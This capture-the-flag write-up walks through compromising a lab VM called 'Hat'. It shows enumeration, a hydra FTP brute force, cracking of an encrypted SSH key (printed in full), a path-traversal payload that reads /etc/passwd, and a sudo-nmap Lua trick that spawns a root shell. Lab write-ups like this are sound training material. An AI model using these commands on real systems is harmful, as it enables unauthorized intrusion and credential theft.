<!--Not working with the Cyber Kill-Chain module but with an abstract categorization of the steps! -->

***Remote Target IP: `10.0.0.24`***

## **Enumeration**

### ***#1 NMAP***

    root@kali ~/D/M/Hat# nmap -sS -p- -A -T4 10.0.0.24

    PORT      STATE    SERVICE VERSION
    22/tcp    filtered ssh
    80/tcp    open     http    Apache httpd 2.4.38 ((Debian))
    |_http-title: Apache2 Debian Default Page: It works
    |_http-server-header: Apache/2.4.38 (Debian)
    65535/tcp open     ftp     pyftpdlib 1.5.4
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |  Connected to: 10.0.0.24:65535
    |  Waiting for username.
    |  TYPE: ASCII; STRUcture: File; MODE: Stream
    |  Data connection closed.
    |_End of status.

**`SSH`** is filtered to we need to pay attention to that later on.  
**`FTP`** on port 65535 does not allow anonymous, so let's enumerate **`HTTP`** and try to find some credentials.

### ***#2 HTTP***

![image](https://user-images.githubusercontent.com/76552238/174811467-f931a506-3b87-4cb9-b576-aa56f98d9542.png)

Going to **`http://10.0.0.24`** we have Apache2's default page. Let's scan the directories to find any files.

    root@kali ~/D/M/Hat# gobuster dir -u http://10.0.0.24/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,html,php

    /index.html           (Status: 200) [Size: 10701]
    /logs                 (Status: 301) [Size: 305] [--> http://10.0.0.24/logs/]
    /php-scripts          (Status: 301) [Size: 312] [--> http://10.0.0.24/php-scripts/]

We found 2 directories on the remote server. Let's scan them as well.

    root@kali ~/D/M/Hat# gobuster dir -u http://10.0.0.24/logs -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,html,php,log

    /index.html           (Status: 200) [Size: 4]
    /vsftpd.log           (Status: 200) [Size: 1834]

We found the log file for the **`FTP`** server on the machine.

### **http://10.0.0.24/logs/vsftpd.lop:**

    [I 2021-09-28 18:43:57] >>> starting FTP server on 0.0.0.0:21, pid=475 <<<
    [I 2021-09-28 18:43:57] concurrency model: async
    [I 2021-09-28 18:43:57] masquerade (NAT) address: None
    [I 2021-09-28 18:43:57] passive ports: None
    [I 2021-09-28 18:44:02] 192.168.1.83:49268-[] FTP session opened (connect)
    [I 2021-09-28 18:44:06] 192.168.1.83:49280-[] USER 'l4nr3n' failed login.
    [I 2021-09-28 18:44:06] 192.168.1.83:49290-[] USER 'softyhack' failed login.
    [I 2021-09-28 18:44:06] 192.168.1.83:49292-[] USER 'h4ckb1tu5' failed login.
    [I 2021-09-28 18:44:06] 192.168.1.83:49272-[] USER 'noname' failed login.
    [I 2021-09-28 18:44:06] 192.168.1.83:49278-[] USER 'cromiphi' failed login.
    [I 2021-09-28 18:44:06] 192.168.1.83:49284-[] USER 'b4el7d' failed login.
    [I 2021-09-28 18:44:06] 192.168.1.83:49270-[] USER 'shelldredd' failed login.
    [I 2021-09-28 18:44:06] 192.168.1.83:49270-[] USER 'anonymous' failed login.
    [I 2021-09-28 18:44:06] 192.168.1.83:49296-[] USER 'sml' failed login.
    [I 2021-09-28 18:44:09] 192.168.1.83:49292-[] USER 'alienum' failed login.
    [I 2021-09-28 18:44:09] 192.168.1.83:49280-[] USER 'k1m3r4' failed login.
    [I 2021-09-28 18:44:09] 192.168.1.83:49284-[] USER 'tatayoyo' failed login.
    [I 2021-09-28 18:44:09] 192.168.1.83:49278-[] USER 'Exploiter' failed login.
    [I 2021-09-28 18:44:09] 192.168.1.83:49268-[] USER 'tasiyanci' failed login.
    [I 2021-09-28 18:44:09] 192.168.1.83:49274-[] USER 'luken' failed login.
    [I 2021-09-28 18:44:09] 192.168.1.83:49270-[] USER 'ch4rm' failed login.
    [I 2021-09-28 18:44:09] 192.168.1.83:49282-[] FTP session closed (disconnect).                             
    [I 2021-09-28 18:44:09] 192.168.1.83:49280-[ftp_s3cr3t] USER 'ftp_s3cr3t' logged in.                       
    [I 2021-09-28 18:44:09] 192.168.1.83:49280-[ftp_s3cr3t] FTP session closed (disconnect).                   
    [I 2021-09-28 18:44:12] 192.168.1.83:49272-[] FTP session closed (disconnect). 

Looking at the log file, we can see that the user **'ftp_s3cr3t'** was able to log in to the remote server. So let's brute force the password of the user using **`hydra`**.

    root@kali ~/D/M/Hat [SIGINT]# hydra -l 'ftp_s3cr3t' -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.24 -s 65535 -IV 

    [65535][ftp] host: 10.0.0.24   login: ftp_s3cr3t   password: cowboy

After logging in to the **`FTP`** server we can download 2 files, **`id_rsa`** and **`note`**.

### ***note:***

    Hi,

    We have successfully secured some of our most critical protocols ... no more worrying!




    Sysadmin

### ***id_rsa:***

    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: DES-EDE3-CBC,6F30B7B22B088AB2

    JmLJqI4m9jk1McrIzNFyuYrPyPu3Znw6awuyEIK0ZctgYabjNk5MVCM0FH45SQCl
    rqK3QqSACiOq4+DnMWrECj5CO+JPzGjIupgz8IrW0Cr7mkRSNa9fCeEBrIzAi924
    GEM72PMuwlBM4zWDZ/962gtZpDnzXYLc9mYdVTe+ubI2NrVC6d2ak1L5GMsBdYwi
    BVj8bhnUsr4doXi1ZcRAZoHUses/Z8ohfNXkUoDO2d1kQmiE0hAVEUnBerzV+E84
    GpJFBgHphboG9E+R3Gh27viM3pY0qFvU/PWbTJ8Y6LgSgJPMLldlEuBEym0LPDpc
    27L7wdKEYwCjPWBGtuGnKsdfleQfsyKijH8/YDlH0hsrDc83ZMcDR13jtfZbZjHZ
    IwVdhUuKdHp6Ig4lmxi1RqJA35CD6ZHHMzOKlm1TjQskA0j6jdPeJ3o5ebh/z3oe
    tr3FKEawz+2KQa+CX+frCwN/rLFUc8MOvh7I4/jJ9o2kdKB0u5OHH+pgXfmhTJzl
    mVSqOtti7cxefUb142Jltku5kElwKdvVEHw+qmZNMwrw+Kv7rlpvezfsW4uzm8Je
    nlmxXoMl62Z3FKPjKarEqZrbO6bHf6lWAIrJgJGydRn1tpD/IY1DJZKwa0aLrkbr
    7hu8C0LSpIVdy5ZUSaT04ZL/FBxDQR7cg2/ZYF5Kc1pvIgjXrlEsbbSPDyg2bLIW
    eCMRnevvsTS8l55qUvQ2GO73kHMcWfkAsvUaojLiSxXGTcd+gPf6kXiwTbz2wbTR
    KPzDwKaTn74yW+9jc88+6D8CdT6OrN+2eP8K0ukdNwMqVc+Mag0TOOCwq+QVfKwf
    O7A+3+13xjUy1/TKRIJDXuhL88RDrzA7U4uy9ZDYEq5z2HVc3agqnHMBP4k2n0KE
    u2YoCNOp52Q4YpKoXoz5Ojw8CuUIhNqoilh/0j+gkdgIO5jMAEBT7p6M/fnhfHpe
    VNCimSJfTjLCU49Tez0HeDDCuE4oG/vShjM0ebZHMMWTY8vVOaRz4Ktcx938Jpnj
    /j9Z0NEAEUI2ISZGGDLS/O0fhyN9lsl1UrY2yR3NnXgbX3YkjWLDM4C8mWSCejpl
    XhWSUYlt8X83atlUfTcn97QVGeJXvlJhBUrYEtsTHjDc2lsH3KQNYtpckQizpcyW
    axJjIeWhI+eqWIVwsXTxKI2hIa6XuYdjUP7cusDad+pUo1Y7h0wTwLP1KYtkXrm3
    sEvB8X2mX6tHB+1iO67UKjFdZ7Ti1Q2XY6zCCbOl3S5b24MFAFANDYgkr1QtgQqs
    j+tSrrd1yOn4AeM6SdyLdVxKQBY2s0+9dvLmaJLH9OOdV0G4I4WcMuum40WMzXrf
    fBAMIh7Gl0lEWPOrPtOxrQI++kAlyzNTK1oxSvdc/f30TOB4hGH8yU3EKzRh/QTa
    fHkcKP9V7Y0xKwrg2yLuWsFSt4QnFUZEbV+wDq2i9NqvriYOxSa2qarPP04FVZRp
    5xYdSGWdMuPFTEAaM+67wR33zzlYKvnEmE9CRHnAqVpqHFuNmgYD+S3KhzW3X1A3
    zlflWacIB06p/cXCr3w6XNqa0y2TsNmuT2IR6JX+Qr6usNV4QWL/Jyyy4dE1oBG6
    -----END RSA PRIVATE KEY-----

Reading the private key we can see that it encrypted, so if we want to log in to the remote machine via **`SSH`** we need to find the passphrase for the private key. We can use the command [**`ssh2john`**][1], that allows us to convert the private key to a hash and crack it using **`jonh`**.

    root@kali ~/D/M/Hat# ssh2john id_rsa > hash

    root@kali ~/D/M/Hat# john hash --wordlist=/usr/share/wordlists/rockyou.txt 

![image](https://user-images.githubusercontent.com/76552238/174980274-935ba652-fe10-46fa-85d8-93530e3b1254.png)

Now we need to find a username to log in to **`SSH`** with the private key. Let's go back to HTTP and scan the second directory.

    root@kali ~/D/M/Hat# gobuster dir -u http://10.0.0.24/php-scripts/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,php,html

    /index.html           (Status: 200) [Size: 7]
    /file.php             (Status: 200) [Size: 0]

Going to **`http://10.0.0.24/php-scripts/file.php`** we don't have any content displayed. Since this is a PHP script I tired passing variables in the url such as "**file**" but nothing changed. Let's try to fuzz the url and find the right variable name.

    root@kali ~/D/M/Hat# wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.0.0.24/php-scripts/file.php?FUZZ=../../../../../../../etc/passwd' --hh 0

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                   
    =====================================================================

    000000100:   200        26 L     38 W       1404 Ch     "6" 

Going to **`http://10.0.0.24/php-scripts/file.php?6=../../../../../../../etc/passwd`** we can read the **`/etc/passwd`** file on the remote machine.

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
    sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
    cromiphi:x:1000:1000:cromiphi,,,:/home/cromiphi:/bin/bash
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

>

    root@kali ~/D/M/Hat# cat passwd | grep "/bin/bash"
    root:x:0:0:root:/root:/bin/bash
    cromiphi:x:1000:1000:cromiphi,,,:/home/cromiphi:/bin/bash

The user **`cromiphi`** is on **`SSH`**, let's try to connect to it using the private key we found. But firstly we need to decrypt the private key using the passphrase we got found.

    root@kali ~/D/M/Hat [1]# openssl rsa -in id_rsa -out decrypted_id_rsa
    Enter pass phrase for id_rsa:
    writing RSA key

    root@kali ~/D/M/Hat# cat decrypted_id_rsa 
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAnCusFfdi2p2d42fvqp2yOhPaqmTjjljwMZdT8wQNJfGJ1FrZ
    kBt+oSIgLEnXHQy1sfQL/MPWV4Mb1OsC/ZO/1E44CDup39d6vYv+/rk2zIXG251b
    k3eYf6LQtA+AdbVmU769EdFZMGGvAe2uuKekrlDrRLu5OIyXHooIllF+NZPgfXct
    krzDU6MrCvXIePXYXOYLqdz8QlQGdCd7JciVLvezykHkW/htT6ke9UW+adahDN/c
    maJfrqDMD9/smi7hbw7zCp6EuvfZgqxdustRjBSOzqYVCRY73YCx2G5pP5jQbFGY
    u3tl/l8LEMw/OPBd7QvX5lkcieh4roJTS2xW+QIDAQABAoIBAEoRBFqeq4mXe0xg
    /O/kPqUAyZJKqwnV8IT0imIVJ885EO9f7xNDlvkA4FVg597lKj8tyYmlr8BtdAO1
    OgPd0Pr15ekxss1wusuu288fNHgncjqyFL6J2A+gvm7Hc1tgHxnUuoL60Nv7WC8H
    9PequpXZ1tsQVTYWp41aVdxE5iCuNDrWqauqzyH4ve5cK/dys4dq7MKYAjtMQXXT
    0fgCzI0SioaF8u/LcrlCwzf/VWB6LRSNiNKpxJx4EIsqwroddowAYaFONNkmzKKZ
    i9AI2bJJYkXJ8zH7ZdyxVTX/B57Ijsq8bO80qC2FFDBKjGSi2HQz0uN4WP+an+qJ
    nAeKDgECgYEA5SebMeUyonA6WPTXTpjRxHBQIVd6sU4aUaLSKWnc/xT/vW9XWKOV
    WPWQ+/xpTgExZygmAdpPqiAgHOQyJXddJuCwBAKGIkk2ik29uruW9NJFFaCoqmiN
    nTeljqowNtJQKeX0FrWmJmpoO6KY97pEsEjL3ZPlwI+ZUo0KN+uOJiECgYEArndC
    IBAj7ReYdcgWc4UwwO83rKLUX/qL/zk7S1gXGim5TdUF+h8XGpKdqMGGdR8ZYLaZ
    B6IpayG2XCe/Y04biWxD1uKrw2QA4PX9Me7GpAayCERf0MHrLSJ+dq+ASbyyTxgn
    Yb1XNJbekKijjPMngo6m8FQ8Zym8nPAOLwiDZdkCgYEAj3mJ0OapGk1cKuA5gktq
    YyzS7t0/w42cKurf3PAcX1V9fdUdgjEBzC4MdcknAaD7lpProBNY97KfiJdT0mN2
    3mWlrw0JgKQIUvWzyhuzu1t/x7fMgs1thTcXIEjsYRay/FiuyB05hynuUxBN6CUm
    5pzdj8EPA86k96u47yQ73yECgYAnO+aA82BA5zd/9TknTWKDYMhyaEO+OcfV43b0
    IKFBXvSvDiLD9s3pSeNumea03AOG/kk3sD4EO5aY7s9Zc605oEE5R8w8qnaQIIGK
    AxpktKTAuy+Y8KMEiWdLJXiCHI80vkfM8Rl1WCBBA8uT3PKbp5zfGvJieL5TxKBL
    72wtMQKBgQDKGEpwUZertbCb4TnJ92KnXDZphHAq7lWvwMjAAQ1rYGe+Uol3k4FQ
    f51su1tZveQoj2xSqWDtmbjqaGY9HDqUhrdiJ5IcZrHGqAhsHz0Gk1ZyLXpaY32W
    XaP2XTgOss2VqMTbxvKGm+iJWM0c7TUL27FwHBKEVQgGLnPbIQJBtg==
    -----END RSA PRIVATE KEY-----

# ***IPV6 ??***

<!--
fe80::2468:41ff:fe30:4f55 x
fe80::2b8:c2ff:fe74:7719 ?
fe80::a00:27ff:fe50:4c14 x
fe80::a00:27ff:fed7:be10 v - Correct
fe80::e46e:48ff:fe87:af41
-->

    root@kali ~/D/M/Hat [255]# ssh -6 cromiphi@fe80::a00:27ff:fed7:be10%eth0 -i decrypted_id_rsa

## ***PRIVILEGE ESCALATION***

We can read the first flag on the user's home directory.

    cromiphi@Hat:~$ cat user.txt 
    SdkGsrHxqR52kESSTf6erQZ82jPeHk

Let's see if the user can run any commands with sudo permissions.

    cromiphi@Hat:/home$ sudo -ll
    Matching Defaults entries for cromiphi on Hat:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User cromiphi may run the following commands on Hat:

    Sudoers entry:
        RunAsUsers: root
        Options: !authenticate
        Commands:
            /usr/bin/nmap

The user can run **`NMAP`** as root. Let's search for [**`NMAP Privilege Escalation`**][2].

## **Exploitation**

    cromiphi@Hat:~$ TF=$(mktemp)
    cromiphi@Hat:~$ echo 'os.execute("/bin/bash")' > $TF
    cromiphi@Hat:~$ sudo nmap --script=$TF

![image](https://user-images.githubusercontent.com/76552238/175051830-e9914ec7-5a50-4298-b3ba-1a1464f33dc6.png)

We can now read the final flag on the root directory.

    root@Hat:~# cat root.txt
    root@Hat:~# w3ZhpQtnkxnb8BrqqYK6EGB9rDJ69T


[1]: "https://vk9-sec.com/ssh2john-how-to/"
[2]: "[awd](https://gtfobins.github.io/gtfobins/nmap/)"